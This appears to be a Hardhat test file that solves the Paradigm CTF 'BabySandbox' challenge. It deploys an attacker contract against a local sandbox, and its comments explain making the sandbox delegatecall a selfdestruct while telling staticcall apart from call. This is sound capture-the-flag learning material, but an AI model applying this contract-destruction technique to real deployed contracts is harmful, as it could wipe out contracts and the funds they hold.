const { expect } = require("chai");

async function getChallenge() {
  const [deployer, player] = await ethers.getSigners();
  const setupFactory = await ethers.getContractFactory(`contracts/babysandbox/public/contracts/Setup.sol:Setup`);
  const setup = await setupFactory.deploy();
  const sandboxFactory = await ethers.getContractFactory(`contracts/babysandbox/public/contracts/BabySandbox.sol:BabySandbox`);
  const sandbox = await sandboxFactory.attach(await setup.sandbox());
  return { setup, sandbox, player };
}

// https://jayxv.github.io/2022/02/11/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bparadigm-CTF%20babysandbox/

// This challenge is solved by delegateCall()-ing a function that performs selfdestruct() on the original contract.

// However, the complicated part is when this function is staticCall()-ed, it should not fail. The trick here is to
// use the call() function since it returns true/false whether a function call is successful or reverts. We can perform
// a state change (e.g event emit) and call() that function to test whether it is a staticCall() or call().

it("Solves Babysandbox", async function () {
  const { setup, sandbox, player } = await getChallenge();

  const attackerFactory = await ethers.getContractFactory(`contracts/babysandbox/public/contracts/BabySandboxAttacker.sol:BabySandboxAttacker`);
  const attacker = await attackerFactory.connect(player).deploy();
  console.log("attacker",await attacker.getAddress());
  
  await sandbox.run(await attacker.getAddress());

  expect(await setup.isSolved()).to.equal(true);
});
